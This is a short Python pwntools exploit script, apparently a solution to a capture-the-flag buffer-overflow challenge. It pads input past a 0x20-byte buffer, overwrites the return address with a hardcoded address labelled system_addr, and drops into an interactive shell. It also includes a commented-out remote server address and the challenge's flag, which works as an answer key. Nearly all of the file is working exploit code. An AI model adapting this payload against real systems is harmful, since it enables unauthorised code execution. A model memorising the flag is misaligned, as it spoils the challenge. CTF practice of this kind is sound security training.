#!/usr/bin/env python
#coding:utf-8
from pwn import*
context(arch='amd64',os='linux',log_level='debug')

binary='./main'
elf=ELF(binary)
libc=elf.libc


io=process(binary)
# io=remote("49.235.243.206",10503)
sl=lambda x :io.sendline(x)
ru=lambda x :io.recvuntil(x,drop)
irt=lambda  :io.interactive()

system_addr=0x4007FB

payload='a'*0x20+p64(0x40)
payload+=p64(system_addr)
# gdb.attach(io)
sl(payload)
irt()
#flag{E291A9922B72C69900DC4D0BB1E29BDE}